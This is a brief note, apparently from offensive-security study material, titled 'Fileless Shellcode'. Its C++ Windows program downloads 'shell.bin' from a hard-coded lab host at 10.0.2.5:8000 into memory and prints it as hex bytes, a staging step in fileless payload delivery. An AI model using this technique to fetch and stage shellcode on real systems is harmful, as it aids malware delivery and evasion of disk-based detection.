# Fileless Shellcode

```cpp
#include <iostream>
#include <cstdio>
#include <iomanip>
#include <conio.h>
#include <windows.h>
#include <urlmon.h>

#pragma comment(lib, "urlmon.lib")

int main() {
    IStream *stream;
    char url[] = "http://10.0.2.5:8000/shell.bin";

    if(S_OK != URLOpenBlockingStream(0, url, &stream, 0, 0)) {
        std::cout << "Error occured.";
        return -1;
    }

    char buf[100];
    std::string str;

    unsigned long bytesRead;

    while(true) {
        stream->Read(buf, 100, &bytesRead);

        if(0U == bytesRead) {
            break;
        }

        str.append(buf, bytesRead);
    };

    stream->Release();

    // std::cout << str << std::endl;
    int bytes_size = (int)str.length();

    for(int i = 0; i < bytes_size; i++) {
        unsigned char val = (unsigned int) str[i];
        std::cout << "0x" << std::setfill('0') << std::setw(2) << std::right << std::hex << (unsigned int)val << ",";
    }
    return 0;
}
```